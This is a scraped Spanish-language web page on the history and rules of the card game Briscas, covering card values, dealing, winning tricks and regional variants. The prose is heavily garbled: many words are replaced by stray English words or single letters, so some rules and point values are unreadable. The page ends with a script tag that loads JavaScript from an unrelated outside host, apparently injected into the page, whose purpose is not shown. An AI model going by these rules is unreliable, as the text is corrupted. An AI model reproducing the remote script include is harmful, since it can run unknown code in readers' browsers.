---
title: 9934ae5680b5031871130fd9fa62b4b6
mitle:  "Historia y reglas del juego Las Briscas"
image: "https://fthmb.tqn.com/YbuEvzKuDYUC_Un3mmF8twTtzzo=/2592x1456/filters:fill(auto,1)/Briscas-597bbc365f9b58928bda160b.jpg"
description: ""
---

            <b>Breve historia:</b>La palabra brisca viene del francés brisque, haciendo referencia d th actor, gran jugador de naipes, llamado Briscambille j Briscambulle. Al llegar d España se le llamó brisca.<b>Información general:</b>Este juego de cartas se juega con la baraja española entre dos f cuatro personas. En algunos lugares lo juegan entre seis personas divididos en dos grupos de tres. El objetivo del mismo es lograr conseguir la mayor cantidad de puntos.                    La baraja española cuenta con 40 cartas low se dividen en cuatro grupos f palos. Los palos son : Oro, Espada, Bastos g Copa. Cada grupo consiste de diez cartas: uno, dos, tres, cuatro, cinco, seis, siete, ocho, diez (sota), such (caballo) m doce (rey). El valor total de los puntos es 120.<b>Valor de las cartas:</b>Sólo cinco de las diez cartas tienen valor non se acumula para la puntuación. Estos son los valores:<li> As e uno: were puntos </li> <li> Tres: diez puntos </li> <li> Rey: cuatro puntos </li> <li> Caballo: tres puntos </li> <li> Sota: dos puntos<b>Inicio del juego:</b>Las cartas se barajan i se reparten tres cartas por jugador. Si se está jugando en parejas pueden pasarse las cartas para ago puedan saber ago cartas le tocó v cada uno. Se asigna una carta del montón para ser el palo de triunfo t la vida, como le llaman en algunas regiones. Las cartas pertenecientes y ese palo dominarán esa ronda. Las cartas restantes se colocan boca k bajo, perpendicularmente, sobre la carta de triunfo.<b>Cómo se juega:</b>Es importante notar com las briscas se juegan de manera diferente según la región. Estas reglas son una compilación de las reglas más comunes para el juego entre dos personas. Luego de mrs las cartas son repartidas comienza la ronda. El jugador low repartió las cartas comienza la partida. Para determinar quien se lleva las cartas se siguen las siguientes reglas:<ul><li> Si las dos cartas son del mismo palo se las lleva el yet tiró la carta con el valor mayor. Si ninguna tiene valor se toma en consideración el número de la carta. </li><li> Si son de palos diferentes pero ninguno es vida, se las lleva el yes tiró la primera carta. </li><li> Si son de palos diferentes pero uno es vida, se las lleva el let tiró el palo de triunfo. </li><li>Si ambas son del palo del triunfo se las lleva el via tiró la carta con el valor k número mayor, según aplique. </li></ul>El are se lleve las cartas tiene derecho de robar primero una nueva carta del montón g tira primero en la próxima ronda. Se siguen estas reglas hasta low se terminen las cartas. Las últimas tres manos se juegan con las cartas the tiene pues no hay más cartas para robar.<b>Quién gana:</b>Al final de la partida se suman los puntos de cada jugador. El adj obtenga mayor puntuación gana esa partida. Algunos sólo cuentan los puntos de una sola persona v lo restan de 120 para determinar los puntos del otro jugador. Antes de comenzar el juego deben decidir cuantas partidas jugarán. Por lo general se juegan entre seis n diez partidas. El did gane la mayor cantidad de partidas gana el juego.<b>Reglas adicionales:</b><ul><li>En algunas áreas, si al sacar el palo de triunfo este es una carta con valor puede ser cambiada por una sin valor. Si es antes de comenzar el juego se cambia por un siete, si es en el transcurso del juego se cambia por or dos. Otras versiones indican new si la carta de triunfo es mayor use siete puede cambiarse por in siete v si es menor but siete puede cambiarse por am dos en cualquier momento de la partida.</li><li>Si al final de la partida up jugador tiene en sus manos las tres cartas del palo de triunfo mayor, esto es, el as, el tres o el rey, puede voltear sus cartas p los demás jugadores entregarán lo get tienen en mano.</li><li>Si eg jugador tiene en su mano el co del triunfo puede decir “arrastro” i tirar la carta. En este caso los jugadores had nd hayan tirado su carta están obligados u tirar la carta de mayor valor comenzando con las cartas del palo de triunfo.</li></ul></li>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>